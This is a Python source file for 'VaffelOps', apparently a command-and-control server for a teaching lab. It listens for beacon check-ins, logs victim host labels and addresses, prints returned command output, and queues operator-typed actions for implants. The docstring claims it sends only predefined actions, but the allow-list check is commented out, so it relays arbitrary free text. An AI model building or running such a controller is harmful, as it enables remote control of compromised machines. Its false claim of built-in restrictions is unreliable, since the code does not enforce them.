"""VaffelOps: avgrenset C2-simulator for en isolert undervisningslab.

Kjør: python collector_updated.py
Velg en forhåndsdefinert lab-handling i terminalen.
Denne serveren kjører aldri skallkommandoer og sender aldri fri tekst til kjøring.
"""
import base64
import json
import os
import queue
import threading
import uuid
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import re

HOST = os.getenv("COLLECTOR_BIND", "0.0.0.0")
PORT = int(os.getenv("COLLECTOR_PORT", "5050"))
LOG = Path(__file__).resolve().parent / "collector_events.jsonl"
pending = queue.Queue()
# CMD_OUTPUT_PATTERN = re.compile(r".*?>(.*)", re.DOTALL)


def now():
    return datetime.now(timezone.utc).isoformat()


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/checkin":
            self.send_error(404)
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if not 0 < length <= 65536:
                raise ValueError("Invalid request size")
            data = json.loads(self.rfile.read(length))

            if not isinstance(data, dict):
                raise ValueError("Expected JSON object")
        except (ValueError, UnicodeDecodeError):
            self.send_error(400)
            return

        result = base64.b64decode(data.get("last_result")).decode("utf-8") if data.get("last_result") else None
        if result is not None:
            result = json.loads(result)

        record = {
            "received_at_utc": now(),
            "source_address": self.client_address[0],
            "host_label": data.get("host_label"),
            "event": data.get("event"),
            "last_result": result,
        }

        with LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
        if result is not None:
            print("\n[RESULTAT]", flush=True)
            for key, value in result.items():
                if key == "output":
                    # match = CMD_OUTPUT_PATTERN.match(value)
                    # if match:
                    #     value = match.group(1)
                    # else:
                    #     value = "<ingen output>"
                    print(f"\n-------------\n{value}", flush=True)
                    continue

                print(f"  {key}: {value}", flush=True)
        # else:
        #     print(f"\n[BEACON] {record['host_label']} fra {record['source_address']}", flush=True)

        try:
            response = pending.get_nowait()
        except queue.Empty:
            response = {"action": "NOOP", "command_id": None}
        if response["action"] != "NOOP":
            print(f"[SENDT] {response['action']} (id={response['command_id']})", flush=True)
        body = json.dumps(response).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        return  # egne mer lesbare meldinger ovenfor


if __name__ == "__main__":
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"VaffelOps C2-simulator lytter på {HOST}:{PORT}")
    print(f"Hendelseslogg: {LOG}")
    print("Skriv en handling og trykk Enter. Skriv 'exit' for å avslutte.\n")
    try:
        while True:
            action = input("lab-action> ").strip()
            if action.upper() in {"EXIT", "QUIT"}:
                break
            if action != "":
                command = {"action": action, "command_id": uuid.uuid4().hex[:8]}
                pending.put(command)
                print(f"[KØ] {action} – sendes ved neste beacon")
            # elif action:
            #     print("Ukjent handling. Tillatt:", ", ".join(sorted(ALLOWED_ACTIONS)))
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        server.shutdown()
        server.server_close()
